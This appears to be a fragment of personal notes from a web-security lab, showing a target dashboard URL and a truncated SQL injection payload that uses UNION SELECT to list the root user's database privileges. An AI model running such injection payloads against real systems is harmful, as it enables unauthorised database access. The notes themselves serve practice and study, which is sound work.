...
http://94.237.50.156:51339/dashboard/dashboard.php

![[Pasted image 20250217160537.png]]
...
```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@
